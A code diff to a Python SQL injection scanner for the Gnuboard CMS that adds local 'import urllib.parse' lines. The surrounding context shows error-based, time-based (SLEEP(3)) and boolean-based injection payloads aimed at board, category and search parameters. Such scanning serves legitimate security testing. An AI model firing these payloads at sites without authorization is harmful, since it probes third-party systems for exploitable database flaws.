@@ -1170,6 +1170,7 @@ class GnuboardSqliScanner:
 
         # Error-based
         for payload in ["'", '"', "' OR '1'='1", "' AND '1'='2"]:
+            import urllib.parse
             url = base_url + urllib.parse.quote(payload)
             try:
                 r = self.session.get(url, timeout=self.timeout)
@@ -1188,6 +1189,7 @@ class GnuboardSqliScanner:
                 continue
 
         # Time-based (3회 확인)
+        import urllib.parse
         sleep_payload = "' AND SLEEP(3)-- -"
         sleep_url = base_url + urllib.parse.quote(sleep_payload)
         median_t, min_t = self._time_based_confirm(sleep_url, n=3)
@@ -1202,6 +1204,7 @@ class GnuboardSqliScanner:
             })
 
         # Boolean-based (응답 크기 비교)
+        import urllib.parse
         true_url = base_url + urllib.parse.quote("test' AND '1'='1")
         false_url = base_url + urllib.parse.quote("test' AND '1'='2")
         try:
@@ -1244,6 +1247,7 @@ class GnuboardSqliScanner:
             return results
 
         base_url = f"{self.base}/bbs/view.php?bo_table={bo_table}&wr_id="
+        import urllib.parse
 
         # Error-based
         for payload in [f"{valid_wr_id}'", f"{valid_wr_id}' AND '1'='1"]:
@@ -1269,6 +1273,7 @@ class GnuboardSqliScanner:
     def _test_sca(self, bo_table: str) -> list[dict]:
         """sca (카테고리) 파라미터 SQLi 테스트"""
         results = []
+        import urllib.parse
 
         # sca는 상대적으로 드문 취약점이므로 error-based만 시도
         for payload in ["'", "' OR '1'='1"]:
@@ -1294,6 +1299,7 @@ class GnuboardSqliScanner:
     def scan_site_search(self) -> list[dict]:
         """사이트 전체 검색 엔드포인트 SQLi 테스트"""
         results = []
+        import urllib.parse
 
         # 그누보드 전체 검색 URL
         search_urls = [
